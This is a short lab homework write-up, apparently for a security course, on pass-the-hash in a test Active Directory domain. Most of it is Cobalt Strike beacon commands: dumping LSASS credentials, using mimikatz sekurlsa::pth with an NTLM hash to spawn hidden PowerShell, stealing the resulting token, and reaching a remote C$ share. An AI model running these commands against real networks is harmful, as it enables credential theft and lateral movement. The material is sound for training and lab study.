## Homework #6
***
pass-the-hash (PTH) with mimikatz in your AD env by following this:
https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/

I will dump creds from LSASS to get my domain account hashes. This is because I am going to PTH to another domain computer with a different local user/password. For local user accounts you can use `hashdump`. You can view the captured credentials under View -> Credentials. 
```
beacon> logonpasswords
```

Create a trust relationship from a username and password hash.
```
beacon> mimikatz sekurlsa::pth /user:Administrator /domain:WIND.local /ntlm:<ntlmhashhere> /run:"powershell -w hidden"
```

Steal the token from the PID created by mimikatz. 
```
beacon> steal_token <PID#here>
```

Test token on remote machine. 
```
beacon> shell dir \\CFC-Win10-02\C$
```

### References
Need to have administrator beacon. Troubleshooting article here. 
https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/

Kandy Walkthrough of PTH
https://www.youtube.com/watch?v=GmrPHD7k7W0&t=424s